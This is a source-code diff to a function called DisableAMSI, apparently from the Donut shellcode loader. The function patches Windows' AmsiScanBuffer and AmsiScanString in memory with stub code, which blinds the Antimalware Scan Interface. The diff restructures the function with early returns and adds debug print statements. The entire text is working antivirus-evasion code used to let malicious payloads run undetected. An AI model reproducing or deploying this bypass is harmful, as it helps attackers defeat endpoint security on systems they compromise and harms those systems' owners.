@@ -65,6 +65,8 @@ BOOL DisableAMSI(PDONUT_INSTANCE inst) {
     DWORD   len, op, t;
     LPVOID  cs, func_ptr;
     
+    //DebugBreak();
+    
     // try load amsi
     dll = inst->api.LoadLibraryA(inst->amsi.s);
     
@@ -72,40 +74,44 @@ BOOL DisableAMSI(PDONUT_INSTANCE inst) {
     
     // resolve address of AmsiScanBuffer
     cs = inst->api.GetProcAddress(dll, inst->amsiScanBuf);
+    if(cs == NULL) return FALSE;
     
-    if(cs != NULL) {
-      // calculate length of stub
-      len = (ULONG_PTR)AmsiScanBufferStubEnd -
+    // calculate length of stub
+    len = (ULONG_PTR)AmsiScanBufferStubEnd -
         (ULONG_PTR)AmsiScanBufferStub;
-        
-      // make the memory writeable
-      if(inst->api.VirtualProtect(
-        cs, len, PAGE_EXECUTE_READWRITE, &op))
-      {
-        // over write with virtual address of stub
-        Memcpy(cs, ADR(PCHAR, AmsiScanBufferStub), len);   
-        // set memory back to original protection
-        inst->api.VirtualProtect(cs, len, op, &t);
-      }
+    
+    DPRINT("Length of AmsiScanBuffer stub is %" PRIi32 " bytes.", len);
+    
+    // make the memory writeable
+    if(inst->api.VirtualProtect(
+      cs, len, PAGE_EXECUTE_READWRITE, &op))
+    {
+      DPRINT("Overwriting AmsiScanBuffer");
+      // over write with virtual address of stub
+      Memcpy(cs, ADR(PCHAR, AmsiScanBufferStub), len);   
+      // set memory back to original protection
+      inst->api.VirtualProtect(cs, len, op, &t);
     }
   
     // resolve address of AmsiScanString
     cs = inst->api.GetProcAddress(dll, inst->amsiScanStr);
+    if(cs == NULL) return FALSE;
     
-    if(cs != NULL) {
-      // calculate length of stub
-      len = (ULONG_PTR)AmsiScanStringStubEnd -
-        (ULONG_PTR)AmsiScanStringStub;
-        
-      // make the memory writeable
-      if(inst->api.VirtualProtect(
-        cs, len, PAGE_EXECUTE_READWRITE, &op))
-      {
-        // over write with virtual address of stub
-        Memcpy(cs, ADR(PCHAR, AmsiScanStringStub), len);   
-        // set memory back to original protection
-        inst->api.VirtualProtect(cs, len, op, &t);
-      }
+    // calculate length of stub
+    len = (ULONG_PTR)AmsiScanStringStubEnd -
+      (ULONG_PTR)AmsiScanStringStub;
+     
+    DPRINT("Length of AmsiScanString stub is %" PRIi32 " bytes.", len);
+    
+    // make the memory writeable
+    if(inst->api.VirtualProtect(
+      cs, len, PAGE_EXECUTE_READWRITE, &op))
+    {
+      DPRINT("Overwriting AmsiScanString");
+      // over write with virtual address of stub
+      Memcpy(cs, ADR(PCHAR, AmsiScanStringStub), len);   
+      // set memory back to original protection
+      inst->api.VirtualProtect(cs, len, op, &t);
     }
     return TRUE;
 }
